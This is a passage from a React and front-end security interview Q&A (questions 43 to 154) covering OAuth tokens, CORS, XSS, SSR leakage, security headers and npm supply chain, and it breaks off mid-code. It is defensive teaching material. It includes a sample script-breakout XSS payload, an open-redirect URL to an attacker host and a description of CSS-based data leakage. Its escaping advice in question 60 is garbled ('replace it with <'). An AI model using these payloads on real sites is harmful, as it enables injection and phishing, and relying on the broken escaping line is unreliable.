The implicit flow returned the access token directly in the URL fragment. Tokens in URLs can leak through browser history, logs, the `Referer` header and malicious scripts, and there is no way to bind the token to the client that started the flow. The OAuth 2.0 Security Best Current Practice says to use the authorization code flow with PKCE instead.

## 44: What is the difference between an access token and an ID token?

- **Access token**: sent to an API to access resources. The API checks it. The client should treat it as an opaque string.
- **ID token**: tells the client who logged in. It is a JWT meant for the client app, not for calling APIs.

A common mistake is sending the ID token to your API as if it were an access token.

## 45: What is a refresh token?

A refresh token is a long-lived token used to get new access tokens without asking the user to log in again. Access tokens are kept short-lived (minutes), and the refresh token is used when they expire. Because refresh tokens are powerful, they need extra protection, such as rotation and storage in an httpOnly cookie or on a backend.

## 46: What is silent token refresh?

It means getting a new access token in the background before or after the current one expires, without interrupting the user. Today it is usually done with a refresh token. Older setups used a hidden iframe with `prompt=none`, which breaks in browsers that block third-party cookies.

## 47: What is an auth context in React?

It is a React context that holds the current auth state (the user, whether they are logged in, loading state) and functions like `login` and `logout`. Components read it with a hook like `useAuth()` instead of passing auth data through props.

```jsx
const AuthContext = createContext(null);

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside AuthProvider");
  return ctx;
}
```

## 48: What is an HTTP interceptor?

An interceptor is code that runs for every request or response in an HTTP client. With axios you can add one to attach the access token to each request, or to handle `401` responses in one place.

```js
api.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});
```

`fetch` has no interceptors, so you write a small wrapper function instead.

## 49: What is the difference between a 401 and a 403 response?

- **401 Unauthorized**: the request has no valid authentication, for example the token is missing or expired. The client should log in or refresh the token.
- **403 Forbidden**: the user is authenticated but not allowed to do this. Refreshing the token will not help. The client should show an "access denied" message.

## 50: What is CORS?

CORS (Cross-Origin Resource Sharing) is a browser mechanism that lets a server say which other origins may read its responses. By default, the same-origin policy stops JavaScript on `app.example.com` from reading responses from `api.other.com`. The API can allow it with headers like `Access-Control-Allow-Origin`.

## 51: Does CORS protect your API from attackers?

No. CORS is enforced by browsers, and it controls whether JavaScript on another origin can read the response. Tools like curl or Postman ignore it, and in many cases the request is still sent to the server even if the browser blocks reading the response. Your API still needs authentication, authorization and CSRF protection.

## 52: What is a CORS preflight request?

For requests that are not "simple" (for example, methods like `PUT` or `DELETE`, a `Content-Type: application/json` body, or custom headers like `Authorization`), the browser first sends an `OPTIONS` request. The server must answer with headers that allow the origin, method and headers. Only then does the browser send the real request.

## 53: What does credentials: 'include' do in fetch?

It tells the browser to send cookies (and HTTP auth) with a cross-origin request, and to accept cookies set in the response.

```js
fetch("https://api.example.com/me", { credentials: "include" });
```

The server must respond with `Access-Control-Allow-Credentials: true` and a specific origin (not `*`) in `Access-Control-Allow-Origin`, or the browser will block the response. In axios the same option is `withCredentials: true`.

## 54: What is an open redirect?

An open redirect is when your app redirects users to a URL taken from user input without checking it, for example `/login?returnTo=https://evil.example`. Attackers use your trusted domain in phishing links, and the user ends up on their site. In OAuth flows, open redirects can also help attackers steal codes or tokens.

## 55: What is the difference between client-side and server-side validation?

Client-side validation runs in the browser and gives users fast feedback, like "email is required". It can be bypassed easily by calling the API directly. Server-side validation runs on the server and is the one that actually protects your data. Always validate on the server, and add client-side validation for a better user experience.

## 56: What is Zod?

Zod is a TypeScript-first schema validation library. You describe the shape of your data once, and Zod checks values at runtime and gives you a TypeScript type for free.

```ts
import { z } from "zod";

const SignupSchema = z.object({
  email: z.email(),
  password: z.string().min(12),
});

type Signup = z.infer<typeof SignupSchema>;
```

Because it runs on both client and server, you can share the same schema in both places.

## 57: What is React Hook Form?

React Hook Form is a form library that keeps form state with uncontrolled inputs and refs, so it re-renders less. It has built-in validation rules and works with schema libraries like Zod through `@hookform/resolvers`. It is a user-experience tool; it does not replace server validation.

## 58: Why does server-side rendering bring new security concerns?

With SSR, React code runs on the server, has access to secrets and databases, and writes HTML that includes data. New risks include:

- Putting more data into the HTML or hydration payload than the user should see.
- Breaking out of a `<script>` tag when serializing initial state.
- Caching a page with one user's data and serving it to others.
- Leaking stack traces in server errors.

## 59: What is hydration state leakage?

During SSR, the server sends data to the client so React can hydrate (for example `window.__INITIAL_STATE__`, `__NEXT_DATA__` or the RSC payload). If you pass a whole database object, it may include fields like password hashes, emails of other users or internal flags. Even if the UI does not show them, they are in the page source for anyone to read.

## 60: Why is JSON.stringify inside a script tag unsafe?

`JSON.stringify` does not escape `<`. If a value contains `</script>`, the browser ends the script tag there and parses the rest as HTML.

```js
// Unsafe
`<script>window.__STATE__ = ${JSON.stringify(state)}</script>`;
// If state.name is "</script><script>alert(1)</script>", the attacker's script runs.
```

Escape `<` (for example replace it with `<`) or use a library like `serialize-javascript`.

## 61: What are React Server Components, from a security point of view?

React Server Components (RSC) run only on the server. They can read databases and secrets directly, and only their rendered output is sent to the browser. This is good for security because secrets never need to reach the client. The risk is that any props you pass to a Client Component are serialized and sent to the browser, so you must be careful about what crosses that boundary.

## 62: What are Server Functions (Server Actions)?

Server Functions are async functions marked with `'use server'` that run on the server but can be called from client code, like a normal function. React calls them Server Functions; when used with forms and actions, Next.js calls them Server Actions.

```ts
"use server";

export async function updateName(formData: FormData) {
  // runs on the server
}
```

Under the hood, the framework creates an HTTP endpoint for each one.

## 63: Are Server Actions public endpoints?

Yes. Every Server Action that is used by client code can be called by anyone who sends the right POST request. They are not private just because they are not listed in an `api/` folder. You must check authentication, authorization and validate inputs inside each action, just like an API route.

## 64: What is the server-only package?

`server-only` is a small package that causes a build error if a module that imports it ends up in a client bundle.

```ts
// lib/db.ts
import "server-only";

export async function getUserSecrets() {
  /* uses DB credentials */
}
```

If someone imports this file from a Client Component, the build fails instead of quietly shipping server code (and maybe secrets) to the browser.

## 65: How do environment variables work in a front-end React app?

Front-end bundlers (Vite, Next.js, webpack) replace environment variable references with their actual values at build time. The values become plain strings inside the JavaScript bundle that every visitor downloads. So in a browser app, "environment variables" are build configuration, not secrets.

## 66: What does the VITE_ prefix mean?

Vite only exposes variables that start with `VITE_` to client code through `import.meta.env`. Variables without the prefix stay out of the bundle.

```js
const apiUrl = import.meta.env.VITE_API_URL; // ends up in the bundle
```

The prefix is a reminder that the value is public. Never put a secret into a `VITE_` variable.

## 67: What does the NEXT_PUBLIC_ prefix mean in Next.js?

Variables that start with `NEXT_PUBLIC_` are inlined into the JavaScript sent to the browser. Variables without it are only available on the server (Server Components, route handlers, Server Actions). In client code, a non-public variable is `undefined`.

```ts
process.env.NEXT_PUBLIC_ANALYTICS_ID; // public
process.env.DATABASE_URL; // server only
```

## 68: Can you hide an API key in a React app?

No. Anything the browser has, the user can see: in the bundle, the network tab or memory. Obfuscation only slows people down a little. If an API key is secret, keep it on a server and call the third-party API through your backend or a serverless function. Keys meant to be public (like a maps key) should be restricted by domain, API and quota in the provider's console.

## 69: What are source maps?

Source maps are files that map minified, bundled code back to your original source files. They make stack traces and debugging readable. A bundle points to its map with a comment like `//# sourceMappingURL=main.js.map`.

## 70: Should you publish source maps in production?

Usually not publicly. Public source maps let anyone read your original code, including comments, internal API routes, feature flags and logic. That is not a vulnerability by itself, since the client code is already public, but it makes attackers' work much easier. A common approach is to generate them during the build, upload them to your error tracker (like Sentry), and not serve them to users.

## 71: What is clickjacking?

Clickjacking is when an attacker loads your site in an invisible iframe on their page and tricks the user into clicking buttons on your site, for example "Delete account" or "Confirm payment", while the user thinks they are clicking something else.

## 72: What is the X-Frame-Options header?

`X-Frame-Options` tells the browser whether your page may be shown in a frame.

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

It is an older header. The modern replacement is the CSP `frame-ancestors` directive, but many sites send both for older browsers.

## 73: What does the CSP frame-ancestors directive do?

It controls which sites are allowed to embed your page in a frame.

```
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://partner.example
```

`'none'` blocks all framing, which protects against clickjacking. It must be sent as an HTTP header; it does not work in a meta tag.

## 74: What is Subresource Integrity (SRI)?

SRI lets the browser check that a script or stylesheet loaded from another server has not been changed. You add a hash of the expected file to the tag. If the file's hash does not match, the browser refuses to run it. It protects you if a CDN gets hacked or serves a modified file.

## 75: How do you add SRI to a script tag?

Add the `integrity` attribute with the hash, and `crossorigin="anonymous"`:

```html
<script
  src="https://cdn.example.com/lib@1.2.3/lib.min.js"
  integrity="sha384-BASE64HASH..."
  crossorigin="anonymous"
></script>
```

The file must be a fixed version. If the URL points to "latest", the hash will break when the file changes.

## 76: Why does SRI need the crossorigin attribute?

To check the hash of a file from another origin, the browser needs to read its contents, which requires a CORS request. `crossorigin="anonymous"` makes the browser fetch it with CORS and without cookies. The CDN must send `Access-Control-Allow-Origin`. Without this, the integrity check fails and the script is blocked.

## 77: What is window.postMessage?

`postMessage` lets windows from different origins send messages to each other, for example a page and an iframe, or a page and a popup.

```js
iframe.contentWindow.postMessage({ type: "resize" }, "https://widget.example");
```

The receiver listens with `window.addEventListener('message', handler)`.

## 78: Why do you need to check event.origin when receiving messages?

Any window that has a reference to yours (an iframe, a popup, a page that opened you) can send you a message. If you act on messages without checking where they came from, an attacker's page can send fake messages, for example "login succeeded" or "navigate to this URL".

```js
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example") return;
  // handle event.data
});
```

## 79: What is the iframe sandbox attribute?

`sandbox` puts heavy restrictions on an iframe's content: no scripts, no forms, no popups, no top navigation, and a unique origin. You can relax specific rules with values like `allow-scripts` or `allow-forms`.

```jsx
<iframe src={url} sandbox="allow-scripts" title="Preview" />
```

It is useful when you show untrusted content, like user HTML or a third-party widget.

## 80: What is a supply chain attack?

It is an attack where the attacker compromises something you depend on instead of your own code: an npm package, a build tool, a CDN or a CI action. A typical React app has hundreds of dependencies, and any of them can run code during install or end up in your bundle, so one bad package can steal secrets or inject code into your app.

## 81: What does npm audit do?

`npm audit` checks your installed dependencies (based on the lockfile) against a database of known vulnerabilities and lists problems with their severity and fixed versions.

```bash
npm audit
npm audit --audit-level=high   # fail only on high or critical
npm audit fix                   # apply compatible fixes
```

It only finds known vulnerabilities. It will not catch a new malicious package.

## 82: What is a lockfile and why should you commit it?

A lockfile (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`) records the exact version and integrity hash of every installed package, including deep dependencies. Committing it means everyone and every CI build installs the same code, and a new (possibly malicious) version of a dependency does not slip in silently.

## 83: What is typosquatting in npm?

Typosquatting is publishing a malicious package with a name close to a popular one, like `reakt-dom` or `lodahs`, hoping someone mistypes it. Once installed, it can run install scripts or ship harmful code. Check the package name, author, download count and repository before adding a dependency.

## 84: What is the difference between npm ci and npm install?

`npm ci` installs exactly what is in the lockfile and fails if `package.json` and the lockfile do not match. It also deletes `node_modules` first. `npm install` can update the lockfile. Use `npm ci` in CI and deployments so builds are reproducible and you do not pull in unexpected versions.

## 85: What are error boundaries?

Error boundaries are components that catch errors thrown while rendering their children and show a fallback UI instead of crashing the whole app. You can write one as a class with `getDerivedStateFromError` and `componentDidCatch`, or use the `react-error-boundary` package.

```jsx
<ErrorBoundary fallback={<p>Something went wrong.</p>}>
  <Dashboard />
</ErrorBoundary>
```

## 86: Why should you not show raw error messages to users?

Raw errors can leak internal details: stack traces, file paths, SQL queries, library versions, internal URLs or data. This helps attackers plan their next step. Show users a simple message and an error ID, and send the full details to your logging system.

## 87: What can a user see with React DevTools?

React DevTools shows the component tree with every component's props, state, hooks values and context. It works on production builds too. So any data you put into React, including data you do not display, can be seen by the user. Treat everything in the client as visible to the user.

## 88: Is data in a Redux or Zustand store secret?

No. State stores live in the browser's memory, and the user can read them with DevTools, Redux DevTools (if enabled) or by inspecting objects. Only store data the current user is allowed to see. Do not keep secrets, other users' data or server-only fields there.

## 89: What is the OWASP Top 10?

The OWASP Top 10 is a list of the most critical web application security risks, published by the OWASP foundation and updated every few years. The current edition is from 2025. Teams use it as a checklist for training, code review and testing.

## 90: Which OWASP Top 10 (2025) categories matter most for React apps?

All ten matter for the whole app, but these show up most in React work:

- **A01 Broken Access Control**: trusting client-side guards and hidden buttons.
- **A02 Security Misconfiguration**: missing CSP and security headers, public source maps.
- **A03 Software Supply Chain Failures**: risky npm packages.
- **A05 Injection**: XSS through `dangerouslySetInnerHTML`, URLs and markdown.
- **A07 Authentication Failures**: weak token handling and session management.

## 91: Why must a React app be served over HTTPS?

Without HTTPS, anyone on the network can read and change traffic. They could steal tokens and cookies, or inject scripts into your bundle on the way to the user, which skips every other protection you have. Many browser features (service workers, `Secure` cookies, some APIs) also require HTTPS.

## 92: Which security headers should a React app send?

Common ones:

- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `X-Frame-Options` or CSP `frame-ancestors`
- `Permissions-Policy`
- `Cross-Origin-Opener-Policy`

These are set by the server, CDN or hosting config, not by React code.

## 93: What is HSTS?

HSTS (HTTP Strict Transport Security) tells the browser to always use HTTPS for your domain for a set time, even if the user types `http://`.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

It prevents attacks that downgrade the connection to HTTP.

## 94: What does X-Content-Type-Options: nosniff do?

It tells the browser not to guess the content type of a response. Without it, a browser might treat an uploaded text file or image as a script or HTML if the content looks like one. With `nosniff`, the browser uses the declared `Content-Type`, and blocks scripts and styles with the wrong type.

## 95: What is Referrer-Policy and why does it matter?

`Referrer-Policy` controls how much of the current URL is sent in the `Referer` header when the user follows a link or the page loads a resource. If your URLs contain tokens, reset codes or IDs, a loose policy can leak them to third-party sites.

```
Referrer-Policy: strict-origin-when-cross-origin
```

## 96: Why use rel="noopener noreferrer" on external links?

When a link opens in a new tab with `target="_blank"`, the new page could get a reference to your page through `window.opener` and change its location to a phishing page (reverse tabnabbing). `noopener` removes that reference, and `noreferrer` also hides the `Referer` header.

```jsx
<a href={url} target="_blank" rel="noopener noreferrer">
  Docs
</a>
```

## 97: Do modern browsers still need rel="noopener" for target="_blank"?

Modern browsers treat `target="_blank"` as `noopener` by default, so the risk is much lower now. Many teams still add it for clarity and older browsers, and ESLint's `react/jsx-no-target-blank` rule still checks for it. You still need it if you open windows with `window.open`, where you should pass `'noopener'` in the features.

## 98: What is DOM-based XSS?

DOM-based XSS happens entirely in the browser. Client code reads data from a source the attacker controls (like `location.hash`, `location.search` or `postMessage` data) and writes it into a dangerous sink (like `innerHTML`, `eval` or `location.href`). The server never sees the payload. In React apps, it often comes from `dangerouslySetInnerHTML`, refs or URL handling.

## 99: What is the difference between stored and reflected XSS?

- **Stored XSS**: the payload is saved on the server (a comment, a profile field) and shown to every user who views it.
- **Reflected XSS**: the payload is in the request, usually the URL, and the page shows it back right away. The attacker has to get the victim to open a crafted link.

Both work the same way in the browser; the difference is where the payload lives.

## 100: Can URL parameters cause XSS in a React app?

Yes, if you use them in an unsafe place. Rendering a search param as text in JSX is safe. Using it in `dangerouslySetInnerHTML`, `href`, `window.location`, `eval` or a third-party widget that builds HTML is not.

```jsx
const [params] = useSearchParams();
<p>Results for {params.get("q")}</p>; // safe
<a href={params.get("next")}>Continue</a>; // check this URL first
```

## 101: What is the difference between escaping, sanitizing and validating?

- **Escaping** changes special characters so data is treated as text in a specific context (HTML, URL, JS). React does this for JSX.
- **Sanitizing** removes dangerous parts from input that must stay HTML, like DOMPurify does.
- **Validating** checks that input has the expected format and rejects it if not, for example "must be a number between 1 and 100".

You often need more than one of them.

## 102: Why are eval and new Function dangerous?

They turn a string into code and run it. If any part of that string comes from the user, the user can run any code they want in your app. `setTimeout('code')` and `setInterval('code')` with string arguments have the same problem. Strict CSPs also block them unless you add `'unsafe-eval'`. There is almost always a safer way, like a lookup object or `JSON.parse`.

## 103: Is the style prop in React a security risk?

React's `style` prop takes an object, and React sets each property through the CSSOM, so you cannot inject new HTML attributes or tags through it. But if users control CSS values, they can still change how the page looks, for example covering the page with a fake login box, or loading images from their server with `background-image: url(...)` to track users. Limit user control to known values like a color from a palette.

## 104: Can className be used for injection?

You cannot break out of the attribute, so it is not XSS. But if users can set any class name, they can apply your app's own styles in unexpected ways, for example hiding elements, making a fake button look real, or overlaying content. Map user choices to an allowed list of classes instead of passing raw strings.

## 105: Why should you not render a component type chosen by the user?

If you do something like `createElement(userInput)`, the user can choose the element type, such as `script`, `iframe`, `object` or `a`, and combine it with props to load content or run code. Use a map from allowed names to components.

```jsx
const widgets = { chart: Chart, table: Table };
const Widget = widgets[config.type] ?? Fallback;
return <Widget {...safeProps} />;
```

## 106: What is the difference between a session cookie and a JWT-based session?

- **Session cookie**: the cookie holds a random session ID. The server keeps the session data and can delete it at any time to log the user out.
- **JWT-based session**: the token itself holds the claims. The server only checks the signature, so it does not need a session store, but revoking a token before it expires is harder.

Both can be stored in an httpOnly cookie.

## 107: How does logout work when you use JWTs?

On the client, you delete the tokens from memory or storage and clear the user state. But a stolen JWT stays valid until it expires, because the server does not track it. To make logout real, keep access tokens short-lived, revoke the refresh token on the server, and clear httpOnly cookies with a `Set-Cookie` that expires them.

## 108: What is the exp claim in a JWT?

`exp` is the expiration time, in seconds since the Unix epoch. The API must reject the token after this time. The client can read it to know when to refresh, but the server is what enforces it. Access tokens usually expire within 5 to 60 minutes.

## 109: Should the React app verify the JWT signature?

Usually no. The client cannot keep the signing secret, and anyone who can change the token can also change your client code. The API that receives the token must verify the signature, issuer, audience and expiry. OIDC client libraries do check the ID token during login, but authorization decisions still belong on the server.

## 110: What is jwt-decode used for?

`jwt-decode` reads the payload of a JWT without checking the signature. It is fine for showing the user's name or reading `exp` to schedule a refresh. It must never be used to make security decisions, because anyone can create a token with any payload.

```js
import { jwtDecode } from "jwt-decode";
const { exp } = jwtDecode(token);
```

## 111: What is the Backend for Frontend (BFF) pattern?

A BFF is a small server that sits between your React app and your APIs. It handles the OAuth flow, keeps the tokens on the server, and gives the browser only an httpOnly session cookie. The React app calls the BFF, and the BFF adds the access token when calling APIs. This keeps tokens out of JavaScript completely, and it is the approach security guidance recommends for sensitive browser apps.

## 112: What is the Auth0 React SDK?

`@auth0/auth0-react` is Auth0's library for SPAs. You wrap your app in `Auth0Provider` and use the `useAuth0` hook to log in, log out, read the user and get access tokens. It uses the authorization code flow with PKCE.

```jsx
const { isAuthenticated, loginWithRedirect, getAccessTokenSilently } =
  useAuth0();
```

## 113: What is MSAL React?

MSAL React (`@azure/msal-react`, built on `@azure/msal-browser`) is Microsoft's library for signing users in with Microsoft Entra ID and getting tokens for APIs like Microsoft Graph. It provides `MsalProvider`, the `useMsal` hook and components like `AuthenticatedTemplate`, and uses the code flow with PKCE.

## 114: What is Auth.js (NextAuth)?

Auth.js, known as NextAuth.js in Next.js, is an auth library for full-stack JavaScript frameworks. It handles OAuth/OIDC providers, email and credentials sign-in, and sessions. Since the flow runs on the server, tokens can stay on the server and the browser only gets an httpOnly session cookie. Version 5 exposes an `auth()` function you call in Server Components, route handlers and Server Actions.

## 115: What does a typical useAuth hook return?

It usually returns the auth state and actions:

```js
const { user, isAuthenticated, isLoading, login, logout, getToken } = useAuth();
```

Components use `isLoading` to avoid flashing the login page, `user` to show the name, and `getToken` to call APIs. The hook should never return secrets the UI does not need.

## 116: Why must rate limiting be done on the server?

Anything in the browser can be skipped. If you only disable the submit button after three tries, an attacker just calls the login API directly in a loop. Rate limiting, account lockout and bot protection have to be on the server or at the edge. The UI can show a nice message when the server returns `429 Too Many Requests`.

## 117: Why is console.log a risk in production?

Logs can contain tokens, personal data or full API responses. Browser extensions, shared computers and session-replay tools may capture them, and they show users internal details. Remove debug logging from production builds or use a logger that strips sensitive fields.

## 118: What counts as sensitive data in a front-end app?

Examples include passwords, tokens, session IDs, API keys, personal data (names, emails, phone numbers, addresses), payment details, health data, internal IDs that allow guessing other records, and internal system details like hostnames and stack traces. Handle each with the minimum exposure: don't fetch it unless needed, don't store it, and don't log it.

## 119: Should you store personal data in localStorage?

Avoid it. localStorage never expires, stays after logout unless you clear it, can be read by any script on the origin, and is stored as plain text on disk. On a shared computer, the next user may see it. If you must cache data, prefer memory, clear it on logout, and keep only what is needed.

## 120: Is sessionStorage safer than localStorage for tokens?

A little. `sessionStorage` is per tab and is cleared when the tab closes, so tokens live for less time. But it is still readable by any script on the page, so XSS can steal tokens from it just the same. It is better than localStorage, but not as good as keeping tokens out of JavaScript.

## 121: How should you use the autocomplete attribute on sensitive fields?

Use correct values so password managers work well, because good password managers lead to stronger passwords:

```jsx
<input type="email" autoComplete="username" />
<input type="password" autoComplete="current-password" />
<input type="password" autoComplete="new-password" />
<input autoComplete="one-time-code" inputMode="numeric" />
```

Do not use `autoComplete="off"` on passwords to "improve security"; most browsers ignore it, and it hurts users.

## 122: Is a "show password" toggle safe?

Yes, if done correctly. Toggle the input `type` between `password` and `text`. It helps users avoid typos and is recommended by usability and security guidance. Keep it off by default, and avoid anything that would copy the password into other DOM nodes, logs or analytics.

## 123: What is mixed content?

Mixed content is when an HTTPS page loads resources over HTTP. Browsers block active mixed content like scripts, and upgrade or block images. If a script loads over HTTP, an attacker on the network could change it. Make sure every URL in your app, including API base URLs and CDN links, uses HTTPS.

## 124: Why are third-party scripts a security risk?

Scripts like analytics, chat widgets, A/B testing or tag managers run with full access to your page. They can read the DOM, form fields and tokens in storage. If the vendor is hacked or changes its script, your users are affected. Keep the list short, load them with care (CSP, SRI where possible) and review what they collect.

## 125: How does least privilege apply to front-end keys and tokens?

Give each key or token only the access it needs. For a public maps key, restrict it to your domain and the maps API. For access tokens, request only the scopes the app needs. For Supabase or Firebase, use the public key with strict row-level or security rules instead of an admin key. If a key leaks, the damage stays small.

## 126: What are common security misconfigurations in React apps?

- No CSP or other security headers.
- Public source maps.
- Development builds or debug flags in production.
- Secrets in `VITE_` or `NEXT_PUBLIC_` variables.
- Permissive CORS like reflecting any origin with credentials.
- Redux DevTools enabled in production.
- Directory listings or `.env` files served by the web server.

## 127: What are Dependabot and Renovate?

They are tools that check your dependencies and open pull requests to update them, including security fixes. Dependabot is built into GitHub; Renovate works with many platforms and has more config options. They keep dependencies fresh so known vulnerabilities do not stay in your app for months.

## 128: What is a CVE?

A CVE (Common Vulnerabilities and Exposures) is a public ID for a known security vulnerability, like `CVE-2025-55182`. Security advisories, `npm audit` and scanners use CVE IDs so everyone talks about the same issue. When a CVE affects a package you use, check whether your version is affected and update.

## 129: What was the React2Shell vulnerability?

React2Shell (CVE-2025-55182) was a critical remote code execution bug disclosed in December 2025 in the React Server Components packages (`react-server-dom-webpack`, `-parcel`, `-turbopack`). A crafted request to a server using RSC could run code on the server. It was fixed in React 19.0.1, 19.1.2 and 19.2.1, and frameworks like Next.js shipped patched versions. It showed that RSC apps must be patched quickly like any server.

## 130: Which ESLint rules help with React security?

From `eslint-plugin-react`:

- `react/no-danger`: warns on `dangerouslySetInnerHTML`.
- `react/jsx-no-script-url`: flags `javascript:` URLs.
- `react/jsx-no-target-blank`: checks `target="_blank"` links.
- `react/no-find-dom-node` and similar for risky DOM access.

`no-eval` and `no-implied-eval` from core ESLint also help. Linting catches easy mistakes but is not a full security review.

## 131: Is the accept attribute on a file input a security check?

No. `<input type="file" accept="image/*">` only filters the file picker. Users can pick any file, and attackers can send any file directly to the API. The server must check file size, type (by content, not just extension) and store files safely. Client checks are only for a better user experience.

## 132: Why are user-uploaded SVG files risky?

SVG is XML that can contain `<script>` and event handlers. If you insert an SVG's markup into the page or serve it from your own origin and the user opens it directly, scripts can run. Showing it with `<img src="...">` is safer, because scripts inside images do not run. Better still, sanitize SVGs on upload or serve user files from a separate domain.

## 133: Why use the URL constructor to check URLs?

Checking strings with `startsWith` or regex is easy to get wrong. The `URL` constructor parses the URL the same way the browser does, so you can check the real protocol and host.

```js
function isSafeHttpUrl(value) {
  try {
    const url = new URL(value, window.location.origin);
    return url.protocol === "https:" || url.protocol === "http:";
  } catch {
    return false;
  }
}
```

## 134: Why use encodeURIComponent when building URLs?

User input inside a URL can contain `/`, `?`, `&`, `#` and `..`. Without encoding, it can change the path or add query parameters, for example `/api/users/${id}` with `id = "../admin"`.

```js
fetch(`/api/users/${encodeURIComponent(id)}`);
const qs = new URLSearchParams({ q: search }).toString();
```

`URLSearchParams` handles encoding for query strings.

## 135: Where does CAPTCHA fit in a React app?

A CAPTCHA (like reCAPTCHA, hCaptcha or Cloudflare Turnstile) helps block bots on forms like signup, login and contact. The React component only gets a token; the server must verify that token with the provider before accepting the request. A CAPTCHA that is only checked in the client protects nothing.

## 136: What is MFA from the front-end point of view?

MFA (multi-factor authentication) asks for a second proof, like a code from an app, a passkey or a hardware key. The front end shows the extra step and sends the code, but the server decides when MFA is required and checks the code. When you use an identity provider like Auth0 or Entra ID, it usually handles the MFA screens for you.

## 137: What is the Permissions-Policy header?

`Permissions-Policy` controls which browser features the page and its iframes can use, such as camera, microphone, geolocation or payment.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

Turning off features you don't use limits what an attacker or a third-party script can do.

## 138: What is Cross-Origin-Opener-Policy (COOP)?

COOP controls whether pages from other origins that you open, or that open you, share a browsing context group with your page. With `same-origin`, cross-origin windows lose their `window.opener` reference to you. It protects against attacks that use window references, and it is needed (with COEP) for cross-origin isolation.

```
Cross-Origin-Opener-Policy: same-origin
```

## 139: What is window.opener and why can it be dangerous?

When page A opens page B with `window.open` or a `target="_blank"` link, B may get `window.opener`, a reference to A. If B is malicious, it can change A's location to a fake login page while the user is on B. Use `noopener`, and set COOP on your site.

## 140: Are TypeScript and PropTypes security features?

No. They check types during development and build, but they do nothing at runtime against data from the network or the user. An API can return a string where TypeScript expects a number, and nothing stops it. Use runtime validation (like Zod) for data you do not control.

## 141: What are SAST and DAST?

- **SAST** (Static Application Security Testing) scans your source code without running it, for example Semgrep, CodeQL or ESLint security rules. It finds things like `dangerouslySetInnerHTML` with user data.
- **DAST** (Dynamic Application Security Testing) tests the running app from the outside, for example OWASP ZAP or Burp Suite. It finds missing headers, XSS and auth issues.

They find different problems, so teams use both.

## 142: What is penetration testing?

Penetration testing is when security experts try to attack your app the way a real attacker would, to find weaknesses before someone else does. For React apps they look at XSS, auth flows, API access control, token handling and misconfigurations. It is usually done before big releases or once a year.

## 143: What does "never trust the client" mean?

It means the server must assume that anything coming from the browser could be fake or modified: form values, hidden fields, prices, user IDs, roles, headers, and even your JavaScript code. The client can be fully controlled by the user. So every rule that matters must be checked on the server.

## 144: Where should secrets live in a React project?

On servers only: your backend, serverless functions, Server Components or Server Actions, read from environment variables or a secrets manager (like AWS Secrets Manager or Vault). Never in client code, `VITE_`/`NEXT_PUBLIC_` variables, or committed `.env` files. Add `.env*.local` files to `.gitignore`.

## 145: Why is putting tokens in URL query strings a bad idea?

URLs are saved in browser history, server and proxy logs, analytics tools and bookmarks. They can also leak through the `Referer` header to other sites. A token in a URL can end up in many places you do not control. Send tokens in headers or cookies instead.

## 146: What is the state parameter in OAuth?

`state` is a random value the client sends when starting the login. The authorization server sends it back unchanged in the redirect. The client checks that it matches what it stored. This prevents CSRF on the login callback, where an attacker could make a victim log in with the attacker's account. Libraries like Auth0 and MSAL handle it for you.

## 147: What is the nonce parameter in OIDC?

The `nonce` is a random value the client sends in the login request. The identity provider puts it into the ID token. The client checks that the ID token has the same nonce, which stops replay attacks where an old ID token is reused. OIDC libraries handle this automatically.

## 148: Why is user-defined CSS risky?

If users can write custom CSS (for example, profile themes), they can hide or fake parts of your UI, overlay fake forms, and use selectors like `input[value^="a"]` with `background-image` to leak data to their server. Allow only a few safe options, such as preset themes or colors validated against a pattern, rather than raw CSS.

## 149: What does "defense in depth" mean for React apps?

It means using several layers of protection so one mistake does not lead to a full breach. For XSS, for example: React escaping, sanitizing any HTML, a strict CSP, Trusted Types, httpOnly cookies and server-side authorization. If one layer fails, the others still limit the damage.

## 150: What should a basic security checklist for a new React app include?

- Do not use `dangerouslySetInnerHTML` without DOMPurify.
- Validate URLs from users.
- No secrets in client env variables.
- Auth via httpOnly, `Secure`, `SameSite` cookies or a BFF.
- Server-side checks for every permission.
- CSP and security headers.
- No public source maps.
- Lockfile committed, `npm ci` in CI, Dependabot or Renovate on.
- Generic error messages for users.
- Security lint rules turned on.

# Moderate Questions (151-300)

## 151: How do you limit which tags and attributes DOMPurify allows?

Pass a config object. Allowing only what you need is safer than the default profile.

```js
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "br"],
  ALLOWED_ATTR: ["href", "title"],
});
```

You can also use `USE_PROFILES: { html: true }` to disable SVG and MathML, or `FORBID_TAGS` and `FORBID_ATTR` to remove specific items from the default list.

## 152: How would you build a reusable SafeHtml component?

Put sanitizing in one component and ban `dangerouslySetInnerHTML` everywhere else with a lint rule. Then there is only one place to review.

```tsx
import DOMPurify from "dompurify";
import { useMemo } from "react";

type Props = { html: string; className?: string };

export function SafeHtml({ html, className }: Props) {
  const clean = useMemo(
    () => DOMPurify.sanitize(html, { USE_PROFILES: { html: true } }),
    [html],
  );
  // eslint-disable-next-line react/no-danger
  return (
    <div className={className} dangerouslySetInnerHTML={{ __html: clean }} />
  );
}
```

## 153: How do you use DOMPurify during server-side rendering?

DOMPurify needs a DOM. In the browser it uses `window`. On the server you give it one from `jsdom`, or use the `isomorphic-dompurify` package that does this for you.

```js
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const { window } = new JSDOM("");
const DOMPurify = createDOMPurify(window);

const clean = DOMPurify.sanitize(dirty);
```

Keep jsdom out of the client bundle; use it only in server code.

## 154: How can you force all sanitized links to open safely with DOMPurify hooks?

Use the `afterSanitizeAttributes` hook to change nodes after cleaning.

```js
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A" && node.hasAttribute("href")) {
    node.setAttribute("target", "_blank");
